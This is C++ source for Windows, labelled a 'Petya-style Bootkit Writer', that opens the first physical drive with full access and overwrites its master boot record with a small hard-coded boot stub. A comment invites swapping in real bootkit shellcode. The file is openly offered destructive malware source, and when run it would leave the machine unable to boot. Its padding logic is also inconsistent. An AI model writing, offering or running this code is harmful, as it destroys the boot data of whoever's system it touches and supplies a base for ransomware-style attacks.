#include <windows.h>
#include <iostream>
#include <fstream>

#define MBR_SIZE 512

// Replace with real bootkit shellcode — example NOP sled + HLT for demo
unsigned char petyaMBR[MBR_SIZE] = {
    0xFA,                          // CLI
    0x33, 0xC0,                    // XOR AX, AX
    0x8E, 0xD0,                    // MOV SS, AX
    0xBC, 0x00, 0x7C,              // MOV SP, 0x7C00
    0xFB,                          // STI
    0xB8, 0xD8, 0x00,              // MOV AX, 0x00D8
    0x8E, 0xC0,                    // MOV ES, AX
    0xBE, 0x00, 0x7C,              // MOV SI, 0x7C00
    0xBF, 0x00, 0x00,              // MOV DI, 0x0000
    0xB9, 0x00, 0x01,              // MOV CX, 0x0100
    0xF3, 0xA4,                    // REP MOVSB
    0xEA, 0x00, 0x00, 0x00, 0x00,  // JMP 0x0000:0000 (loop forever)
    // Padding with NOPs to fill 512 bytes
};

void OverwriteMBR(const unsigned char* bootcode, size_t size) {
    HANDLE hDevice = CreateFileA(
        "\\\\.\\PhysicalDrive0",
        GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] Failed to open disk: " << GetLastError() << std::endl;
        return;
    }

    DWORD bytesWritten;
    BOOL result = WriteFile(hDevice, bootcode, static_cast<DWORD>(size), &bytesWritten, nullptr);
    if (!result || bytesWritten != size) {
        std::cerr << "[!] Failed to write MBR: " << GetLastError() << std::endl;
    }
    else {
        std::cout << "[+] MBR successfully overwritten." << std::endl;
    }

    CloseHandle(hDevice);
}

int main() {
    std::cout << "[*] Petya-style Bootkit Writer (MBR Overwrite)\n";

    // Fill bootcode buffer with NOPs if shorter than 512 bytes
    if (sizeof(petyaMBR) < MBR_SIZE)
        memset(petyaMBR + sizeof(petyaMBR), 0x90, MBR_SIZE - sizeof(petyaMBR));

    // Last two bytes must be 0x55, 0xAA (boot signature)
    petyaMBR[510] = 0x55;
    petyaMBR[511] = 0xAA;

    OverwriteMBR(petyaMBR, MBR_SIZE);

    return 0;
}
